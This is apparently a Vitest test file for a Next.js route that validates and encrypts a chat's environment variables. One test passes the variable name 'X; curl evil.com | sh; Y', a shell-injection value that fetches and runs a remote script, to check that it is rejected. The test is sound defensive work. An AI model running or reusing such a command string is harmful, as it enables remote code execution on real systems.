import { describe, it, expect, vi, beforeEach } from "vitest"

// Mock the prisma singleton so route logic can be exercised without a DB.
// `vi.hoisted` lets the factory (which is hoisted above imports) see the mocks.
const { chat } = vi.hoisted(() => ({
  chat: {
    update: vi.fn(),
  },
}))
vi.mock("@/lib/db/prisma", () => ({ prisma: { chat } }))

vi.mock("@/lib/db/api-helpers", () => ({
  requireAuth: vi.fn(async () => ({ userId: "u1" })),
  isAuthError: vi.fn(() => false),
  getChatWithAuth: vi.fn(async () => ({ id: "chat_1", userId: "u1" })),
  badRequest: vi.fn((message: string) => Response.json({ error: message }, { status: 400 })),
  notFound: vi.fn((message: string) => Response.json({ error: message }, { status: 404 })),
  internalError: vi.fn((error: unknown) =>
    Response.json({ error: String(error) }, { status: 500 })
  ),
}))

import { GET, PATCH } from "./route"
import { decrypt } from "@/lib/db/encryption"

beforeEach(() => {
  chat.update.mockReset()
})

function makeRequest(body: unknown) {
  return new Request("http://localhost/api/chats/chat_1/env", {
    method: "PATCH",
    body: JSON.stringify(body),
  }) as unknown as import("next/server").NextRequest
}

function params(chatId = "chat_1") {
  return { params: Promise.resolve({ chatId }) }
}

describe("PATCH /api/chats/[chatId]/env", () => {
  it("rejects invalid environmentVariables", async () => {
    const res = await PATCH(makeRequest({}), params())
    expect(res.status).toBe(400)
    expect(chat.update).not.toHaveBeenCalled()
  })

  it("rejects a variable name with a shell metacharacter, naming the offending key", async () => {
    const res = await PATCH(
      makeRequest({ environmentVariables: { "X; curl evil.com | sh; Y": "1" } }),
      params()
    )
    const body = await res.json()

    expect(res.status).toBe(400)
    expect(body.error).toContain("X; curl evil.com | sh; Y")
    expect(chat.update).not.toHaveBeenCalled()
  })

  it("rejects a variable name starting with a digit", async () => {
    const res = await PATCH(makeRequest({ environmentVariables: { "9FOO": "1" } }), params())
    const body = await res.json()

    expect(res.status).toBe(400)
    expect(body.error).toContain("9FOO")
    expect(chat.update).not.toHaveBeenCalled()
  })

  it("accepts valid names and encrypts them before persisting", async () => {
    chat.update.mockResolvedValueOnce({})

    const res = await PATCH(makeRequest({ environmentVariables: { FOO: "bar" } }), params())

    expect(res.status).toBe(200)
    expect(chat.update).toHaveBeenCalledTimes(1)
    const written = chat.update.mock.calls[0][0].data.environmentVariables as Record<
      string,
      string
    >
    expect(decrypt(written.FOO)).toBe("bar")
  })
})

describe("GET /api/chats/[chatId]/env", () => {
  it("is unaffected by the PATCH validation change", async () => {
    // Not the focus of this fix; a smoke test that the route still imports
    // and runs cleanly alongside the new PATCH validation.
    const req = new Request("http://localhost/api/chats/chat_1/env") as unknown as import(
      "next/server"
    ).NextRequest
    const res = await GET(req, params())
    expect(res.status).toBe(200)
  })
})
